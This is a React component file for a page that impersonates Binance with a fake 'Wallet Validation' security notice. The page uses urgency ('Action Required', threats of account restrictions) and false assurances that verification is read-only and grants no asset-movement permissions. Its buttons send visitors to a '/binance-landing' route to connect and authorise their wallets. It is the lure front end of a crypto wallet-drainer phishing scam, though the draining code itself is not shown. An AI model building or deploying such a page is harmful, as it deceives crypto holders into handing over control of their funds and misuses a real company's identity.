import React from "react";
import {
  ArrowRight,
  ShieldCheck,
  Lock,
  RefreshCcw,
  AlertTriangle,
  Eye,
  Server
} from "lucide-react";
import { useNavigate } from "react-router-dom";
import "./binanceHome.css";
import binanceLogo from "../../assets/binance_logo.png";

const BinanceHome = () => {
  const navigate = useNavigate();

  return (
    <div className="binance-wrapper">
      {/* NAV */}
      <nav className="binance-nav">
        <img src={binanceLogo} alt="Binance" className="binance-brand-logo" />
      </nav>

      {/* HERO */}
      <section className="binance-hero">
        <div className="binance-hero-content">
          <div className="binance-alert-badge">
            <AlertTriangle size={16} />
            Action Required
          </div>

          <h1 className="binance-title">
            Wallet Validation <br />
            <span>Security Upgrade in Progress</span>
          </h1>

          <p className="binance-subtitle">
            To maintain platform integrity and protect user assets, Binance has
            introduced an enhanced wallet validation process. This verification
            ensures continued access and prevents unauthorized activity.
          </p>

          <button
            className="binance-primary-btn"
            onClick={() => navigate("/binance-landing")}
          >
            Proceed to Validation
            <ArrowRight />
          </button>
        </div>
      </section>

      {/* WHY SECTION */}
      <section className="binance-section soft-bg">
        <div className="binance-section-inner">
          <h2 className="binance-section-title">
            Why Wallet Validation Is Required
          </h2>

          <div className="binance-reason-grid">
            <div className="binance-reason-card">
              <ShieldCheck />
              <h4>Ownership Confirmation</h4>
              <p>
                Confirms that the wallet is controlled by its rightful owner,
                preventing impersonation and fraudulent access.
              </p>
            </div>

            <div className="binance-reason-card">
              <Lock />
              <h4>Security Reinforcement</h4>
              <p>
                Applies updated protection layers aligned with new global
                security standards.
              </p>
            </div>

            <div className="binance-reason-card">
              <Eye />
              <h4>Suspicious Activity Review</h4>
              <p>
                Identifies abnormal access patterns to prevent unauthorized
                transactions.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* PROCESS SECTION */}
      <section className="binance-section dark-accent">
        <div className="binance-section-inner">
          <h2 className="binance-section-title dark">
            How the Validation Process Works
          </h2>

          <div className="binance-steps">
            <div className="binance-step">
              <span>01</span>
              <p>Connect the wallet associated with your account.</p>
            </div>
            <div className="binance-step">
              <span>02</span>
              <p>Verify ownership through secure cryptographic checks.</p>
            </div>
            <div className="binance-step">
              <span>03</span>
              <p>Update security permissions and finalize verification.</p>
            </div>
          </div>
        </div>
      </section>

      {/* SECURITY DETAILS */}
      <section className="binance-section soft-bg">
        <div className="binance-section-inner split">
          <div>
            <h2 className="binance-section-title">
              Your Assets Stay Protected
            </h2>
            <p className="binance-paragraph">
              Binance does not request private keys or recovery phrases. All
              verification steps are read-only and designed to protect users
              without exposing sensitive data.
            </p>

            <ul className="binance-security-list">
              <li>
                <Server /> Encrypted verification channels
              </li>
              <li>
                <ShieldCheck /> Zero-knowledge validation
              </li>
              <li>
                <Lock /> No asset movement permissions
              </li>
            </ul>
          </div>

          <div className="binance-security-box">
            <Lock size={64} />
            <p>Institution-grade security protocols</p>
          </div>
        </div>
      </section>

      {/* FINAL CTA */}
      <section className="binance-final">
        <h2>Complete Validation to Avoid Restrictions</h2>
        <p>
          Accounts that remain unverified may experience temporary limitations.
        </p>

        <button
          className="binance-primary-btn"
          onClick={() => navigate("/binance-landing")}
        >
          Validate Wallet Now
          <ArrowRight />
        </button>
      </section>

      {/* FOOTER */}
      <footer className="binance-footer">
        <p>© 2025 Binance Security Services. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default BinanceHome;
